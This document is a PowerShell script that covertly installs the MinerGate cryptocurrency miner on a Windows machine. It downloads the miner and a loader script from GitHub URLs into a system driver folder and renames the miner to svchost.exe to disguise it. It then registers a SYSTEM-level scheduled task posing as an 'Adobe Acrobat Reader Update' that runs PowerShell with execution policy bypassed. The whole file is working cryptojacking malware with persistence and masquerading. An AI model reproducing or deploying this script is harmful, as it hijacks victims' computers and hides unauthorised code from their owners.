# Download MinerGate CLI
$url = "https://github.com/diggles9991/MG/raw/master/MinerGate-cli-4.04-win64.zip"
$output = "C:\Windows\System32\drivers\en-US\MG.zip"
$wc = New-Object System.Net.WebClient
$wc.DownloadFile($url, $output)


# Extract zip file
Add-Type -AssemblyName System.IO.Compression.FileSystem
function Unzip
{
    param([string]$zipfile, [string]$outpath)

    [System.IO.Compression.ZipFile]::ExtractToDirectory($zipfile, $outpath)
}
Unzip "C:\Windows\System32\drivers\en-US\MG.zip" "C:\Windows\System32\drivers\en-US\"


# Change Directory
CD C:\Windows\System32\drivers\en-US\

# Rename extracted folder
$oldpath = Get-ChildItem | ?{ $_.PSIsContainer }
Rename-Item $oldpath.name etc


# Remove zip
Remove-Item MG.zip


# Create renamed copy of Miner
Copy-Item C:\Windows\System32\drivers\en-US\etc\minergate-cli.exe C:\Windows\System32\drivers\en-US\etc\svchost.exe


#Delete Miner
Remove-Item C:\Windows\System32\drivers\en-US\etc\minergate-cli.exe


# Create scheduled Start Task
SCHTASKS /Create /RU "SYSTEM" /tn "Adobe Acrobat Reader Update" /sc Weekly /d MON,TUE,WED,THU,FRI,SAT,SUN /st 18:00:00 /du 12:30 /k /ri 10 /tr "powershell.exe -ExecutionPolicy Bypass C:\Windows\System32\drivers\en-US\etc\MinerGateRun.ps1"


# Download Loader
$url2 = "https://raw.githubusercontent.com/diggles9991/RunMG/master/Line.ps1"
$output2 = "C:\Windows\System32\drivers\en-US\etc\Line.ps1"
Import-Module BitsTransfer
Start-BitsTransfer -Source $url2 -Destination $output2
